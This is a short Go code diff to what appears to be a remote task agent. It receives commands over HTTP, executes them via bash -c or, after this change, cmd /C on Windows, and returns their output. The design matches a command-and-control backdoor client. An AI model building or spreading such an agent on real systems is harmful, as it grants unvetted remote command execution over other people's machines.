@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"net/http"
 	"os/exec"
+	"runtime"
 	"time"
 )
 
@@ -41,8 +42,13 @@ func recvTask(r *http.Response) string {
 
 func sendAnswer(id string, cmd string) {
 	var answer models.NewAnswer
+	var command *exec.Cmd
 	answer.ID = id
-	command := exec.Command("bash", "-c", cmd)
+	if runtime.GOOS == "windows" {
+		command = exec.Command("cmd", "/C", cmd)
+	} else {
+		command = exec.Command("bash", "-c", cmd)
+	}
 	out, err := command.Output()
 	if err != nil {
 		answer.Answer = ""
